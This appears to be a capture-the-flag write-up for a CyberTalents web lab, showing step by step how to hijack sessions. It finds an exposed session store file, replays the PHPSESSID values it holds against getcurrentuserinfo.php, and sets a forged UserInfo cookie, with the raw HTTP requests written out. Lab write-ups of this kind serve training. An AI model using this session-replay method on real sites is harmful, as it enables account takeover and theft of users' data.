- view source 
```
  <script type="text/javascript">

      if(document.cookie !== ''){
        $.post('getcurrentuserinfo.php',{
          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
        },function(data){
          cu = data;
        });
      }
    </script>
```
- there is interesting nulls in `getcurrentuserinfo.php` XD
- lets try to add `Cookie: PHPSESSID=abc`
```
HTTP/1.1 200 OK
Server: nginx/1.25.2
Date: Mon, 16 Oct 2023 22:47:41 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 43

Session not found in data/session_store.txt
```
- visit `data/session_store.txt`
- you will find some sessions, try every one of them with  `getcurrentuserinfo.php` like
```
POST /getcurrentuserinfo.php HTTP/1.1
Host: web.cybertalentslabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded 
Content-Length: 36

PHPSESSID=<ThePhpinSessioninTheFiles>
```
- it will provide you with the needed information
- visit index then
```
GET / HTTP/1.1
Host: wcamxwl32pue3e6mkm73p97aqzqw1y3eq9ypfx3m-web.cybertalentslabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=<ThePhpinSessioninTheFiles>; UserInfo=<theNameOfUser>;
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```
